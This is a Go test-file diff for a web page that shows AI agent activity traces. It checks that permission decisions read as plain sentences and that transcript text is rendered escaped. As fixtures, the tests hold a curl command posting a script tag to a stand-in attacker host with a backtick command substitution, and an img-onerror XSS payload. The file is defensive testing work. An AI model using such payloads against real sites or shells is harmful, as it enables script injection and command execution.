@@ -2,6 +2,7 @@ package webui
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"regexp"
 	"strings"
@@ -504,12 +505,251 @@ func TestPlanPermissionAndElisionEachGetACard(t *testing.T) {
 	if !ok || !strings.Contains(plan.Body, "• Read the run — completed") {
 		t.Fatalf("plan detail = %+v", plan)
 	}
-	// Nobody human answered this; the trace owes the reader that fact.
-	if !strings.Contains(steps[1].Summary, "emisar · run_action — allow_always") {
+	// Nobody human answered this; the trace owes the reader that fact, in the
+	// words it happened in rather than the wire's enum spelling.
+	if steps[1].Title != "Used a tool — policy allowed it" {
 		t.Fatalf("permission card = %+v", steps[1])
+	}
+	if !strings.Contains(steps[1].Summary, "keep allowing this for the rest of the session") {
+		t.Fatalf("permission summary = %q", steps[1].Summary)
 	}
 	// A silently short list would read as a complete account of the turn.
 	if steps[2].Tone != "warn" || steps[2].Stats[0].Value != "12" {
 		t.Fatalf("elision card = %+v", steps[2])
+	}
+}
+
+// "Permission decided — allow_always" is the machinery's vocabulary for it.
+// What a reader wants is the two facts underneath: what was asked for, and
+// whether it went ahead. Every decision Coop can record maps to a sentence,
+// including the ones it cannot name — an unrecognised answer rendered as a
+// blank is a decision the page hid.
+func TestPermissionCardNamesTheActionAndTheDecision(t *testing.T) {
+	at := time.Date(2026, 8, 13, 18, 11, 0, 0, time.UTC)
+	for _, want := range []struct {
+		name, toolKind, outcome, decision string
+		title, summary, raw               string
+		tone                              string
+	}{{
+		name: "a lasting allow on a command", toolKind: "execute",
+		outcome: "selected", decision: "allow_always",
+		title:   "Ran a command — policy allowed it",
+		summary: "Allowed, and policy will keep allowing this for the rest of the session.",
+	}, {
+		name: "a one-shot allow on a command", toolKind: "execute",
+		outcome: "selected", decision: "allow_once",
+		title:   "Ran a command — policy allowed it",
+		summary: "Allowed this once — the next request like it is decided again.",
+	}, {
+		name: "the bare allow spelling, on a read", toolKind: "read",
+		outcome: "selected", decision: "allow",
+		title:   "Read a file — policy allowed it",
+		summary: "Allowed this once — the next request like it is decided again.",
+	}, {
+		name: "a lasting refusal on an edit", toolKind: "edit",
+		outcome: "selected", decision: "reject_always",
+		title:   "Did not edit a file — policy refused it",
+		summary: "Refused, and policy will keep refusing this for the rest of the session.",
+		tone:    "warn",
+	}, {
+		name: "a one-shot refusal on a command", toolKind: "execute",
+		outcome: "selected", decision: "reject_once",
+		title:   "Did not run a command — policy refused it",
+		summary: "Refused this once — the next request like it is decided again.",
+		tone:    "warn",
+	}, {
+		name: "the deny spelling, on a delete", toolKind: "delete",
+		outcome: "selected", decision: "deny",
+		title:   "Did not delete a file — policy refused it",
+		summary: "Refused this once — the next request like it is decided again.",
+		tone:    "warn",
+	}, {
+		// What Coop actually does when a request offers it no allow option.
+		name: "a cancelled request", toolKind: "execute",
+		outcome: "cancelled", decision: "",
+		title:   "Did not run a command — policy refused it",
+		summary: "Refused: the request offered no answer Coop is allowed to give, so the call never ran.",
+		tone:    "warn",
+	}, {
+		name: "an answer nobody recorded", toolKind: "execute",
+		outcome: "", decision: "",
+		title:   "Asked to run a command — policy answered",
+		summary: "Coop answered this request, but the record does not say which way.",
+	}, {
+		// The kinds are the agent's, not Responder's. One this page has never
+		// seen is reported as exactly that, beside the value it was given.
+		name: "a decision this page cannot name", toolKind: "execute",
+		outcome: "selected", decision: "escalate_to_owner",
+		title:   "Asked to run a command — policy answered",
+		summary: "Coop recorded an answer this page cannot name. It is printed below, exactly as it was recorded.",
+		raw:     "escalate_to_owner",
+	}, {
+		name: "a tool kind this page has no phrasing for", toolKind: "switch_mode",
+		outcome: "selected", decision: "allow_always",
+		title:   "Used a tool — policy allowed it",
+		summary: "Allowed, and policy will keep allowing this for the rest of the session.",
+	}} {
+		t.Run(want.name, func(t *testing.T) {
+			steps := activitySteps(t, episodePage{Activity: []ActivityMoment{{
+				Kind: "permission", Title: "curl -sS https://api.example.com/v1/runs",
+				ToolKind: want.toolKind, Status: want.outcome, Detail: want.decision, At: at,
+			}}})
+			if len(steps) != 1 {
+				t.Fatalf("want one card, got %d", len(steps))
+			}
+			step := steps[0]
+			if step.Title != want.title {
+				t.Fatalf("title = %q, want %q", step.Title, want.title)
+			}
+			if step.Summary != want.summary {
+				t.Fatalf("summary = %q, want %q", step.Summary, want.summary)
+			}
+			if step.Tone != want.tone {
+				t.Fatalf("tone = %q, want %q", step.Tone, want.tone)
+			}
+			// The enum spelling is not the card's vocabulary anywhere a reader
+			// reads a sentence. Every wire value carries an underscore and no
+			// English sentence here does, so one in either line is a leak.
+			if strings.ContainsRune(step.Title+step.Summary, '_') {
+				t.Fatalf("the wire spelling leaked into the prose: %q / %q",
+					step.Title, step.Summary)
+			}
+			// What was asked for is below the sentence, in a block, never in it.
+			asked, ok := detailByLabel(step, "The command")
+			if want.toolKind != "execute" {
+				if ok {
+					t.Fatalf("a %s call was captioned as a command", want.toolKind)
+				}
+			} else if !ok || asked.Body != "curl -sS https://api.example.com/v1/runs" {
+				t.Fatalf("the command is not in its own block: %+v", step.Details)
+			}
+			if strings.Contains(step.Summary, "curl") {
+				t.Fatalf("the command is back in the summary: %q", step.Summary)
+			}
+			recorded, ok := detailByLabel(step, "The answer Coop recorded")
+			if want.raw == "" {
+				if ok {
+					t.Fatalf("a named decision printed a raw value: %+v", recorded)
+				}
+			} else if !ok || recorded.Body != want.raw {
+				t.Fatalf("an unnamed decision went invisible: %+v", step.Details)
+			}
+			// The insight the card has always carried, kept to what the record
+			// proves: Coop has no path that waits for a person.
+			if !strings.Contains(step.Why, "policy") {
+				t.Fatalf("why = %q", step.Why)
+			}
+		})
+	}
+}
+
+// The bug the operator hit: a permission card put the tool's own arguments
+// through the prose renderer, which found the URL inside the command and made
+// it a link. Tool input is not prose. It renders in a code block, escaped,
+// with nothing looking for markup in it.
+func TestPermissionCommandRendersInertInACodeBlock(t *testing.T) {
+	fixture := newEpisodeProjectionFixture(t)
+	at := time.Date(2026, 8, 13, 18, 11, 0, 0, time.UTC)
+	const hostile = "curl -sS https://evil.example.com/x " +
+		"-d '<script>alert(1)</script>' && echo `id` **not bold**"
+	seed := func(id string, sequence int, kind, title, toolKind, detail string) {
+		fixture.exec(`INSERT INTO agent_activity
+		  (id, episode_id, agent_run_id, session_id, turn_id, sequence, kind,
+		   tool_call_id, title, tool_kind, status, detail, occurred_at, created_at)
+		  VALUES (?,'episode-1','run-1','sess-1','turn-1',?,?,'t1',?,?,'',?,?,?)`,
+			id, sequence, kind, title, toolKind, detail,
+			at.Add(time.Duration(sequence)*time.Second).Format(time.RFC3339Nano), fixture.stamp)
+	}
+	// The tool call names its kind; the permission that answered it does not,
+	// and reads the kind off the call it names.
+	seed("act-1", 1, "tool.started", hostile, "execute", `{"input":{"command":"`+"curl"+`"}}`)
+	seed("act-2", 2, "permission.decided", hostile, "",
+		`{"outcome":"selected","option_id":"opt-1","option_kind":"allow_always"}`)
+
+	reader := fixture.reader()
+	defer reader.Close()
+	body := servePage(t, reader, "/episodes/episode-1")
+
+	if strings.Contains(body, "<script>") {
+		t.Fatal("a transcript string opened a script tag on the page")
+	}
+	if strings.Contains(body, "evil.example.com\"") || strings.Contains(body, "href=\"https://evil.example.com") {
+		t.Fatal("the URL inside a command became a link")
+	}
+	if !strings.Contains(body, "&lt;script&gt;alert(1)&lt;/script&gt;") {
+		t.Fatal("the command's angle brackets were not escaped")
+	}
+	// Every block holding the command holds it as text: escaped content has no
+	// "<" left in it at all, so one is proof that markup got in.
+	blocks := regexp.MustCompile(`(?s)<pre>(.*?)</pre>`).FindAllStringSubmatch(body, -1)
+	found := 0
+	for _, block := range blocks {
+		if !strings.Contains(block[1], "evil.example.com") {
+			continue
+		}
+		found++
+		if strings.Contains(block[1], "<") {
+			t.Fatalf("markup reached a code block: %q", block[1])
+		}
+	}
+	if found == 0 {
+		t.Fatalf("the command was not rendered in a code block at all: %s", body)
+	}
+	// And the card leads with the sentence, not with the command.
+	if !strings.Contains(body, "Ran a command — policy allowed it") {
+		t.Fatal("the card does not say what happened")
+	}
+	if strings.Contains(body, "allow_always") {
+		t.Fatal("the card still shows the wire's enum spelling")
+	}
+}
+
+// The audit behind the fix above, held in place: every other route transcript
+// text takes to this page — a tool's name, its recorded arguments, the model's
+// own prose — escapes it, and none of them can be talked into emitting a tag.
+// The prose renderer does linkify, which is what it is for; what it must never
+// do is let the text close its own tag.
+func TestTranscriptTextNeverBecomesMarkup(t *testing.T) {
+	fixture := newEpisodeProjectionFixture(t)
+	at := time.Date(2026, 8, 13, 18, 11, 0, 0, time.UTC)
+	const hostile = `<img src=x onerror="alert(1)">`
+	// The string has to survive being a JSON value before it can be tested as
+	// an HTML one: embedded raw, its quotes end the field and the payload is
+	// simply unparseable, which passes every assertion below by rendering
+	// nothing at all.
+	quoted, err := json.Marshal(hostile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	seed := func(id string, sequence int, kind, callID, title, toolKind, detail string) {
+		fixture.exec(`INSERT INTO agent_activity
+		  (id, episode_id, agent_run_id, session_id, turn_id, sequence, kind,
+		   tool_call_id, title, tool_kind, status, detail, occurred_at, created_at)
+		  VALUES (?,'episode-1','run-1','sess-1','turn-1',?,?,?,?,?,'',?,?,?)`,
+			id, sequence, kind, callID, title, toolKind, detail,
+			at.Add(time.Duration(sequence)*time.Second).Format(time.RFC3339Nano), fixture.stamp)
+	}
+	// A tool name, a tool's recorded arguments, a plan entry, and model prose.
+	seed("act-1", 1, "tool.started", "t1", hostile, "execute",
+		`{"input":{"command":`+string(quoted)+`}}`)
+	seed("act-2", 2, "model.plan", "", "Plan updated", "",
+		`{"entries":[{"content":`+string(quoted)+`,"status":"pending"}]}`)
+	seed("act-3", 3, "model.thought", "", "Reasoning", "",
+		`{"text":`+string(quoted)+`}`)
+
+	reader := fixture.reader()
+	defer reader.Close()
+	body := servePage(t, reader, "/episodes/episode-1")
+
+	// The escaped rendering contains the letters "onerror" itself, so the tag
+	// opening and the attribute quote are what a leak actually looks like.
+	if strings.Contains(body, "<img") || strings.Contains(body, `onerror="`) {
+		t.Fatal("a transcript string emitted a tag or an event handler")
+	}
+	// Five sinks, five escapes: the card's own heading, the row's name cell,
+	// its flattened arguments cell, the argument disclosure, the plan block,
+	// and the reasoning summary — the prose renderer among them.
+	if got := strings.Count(body, "&lt;img src=x onerror="); got < 5 {
+		t.Fatalf("only %d sinks rendered the string escaped: %s", got, body)
 	}
 }
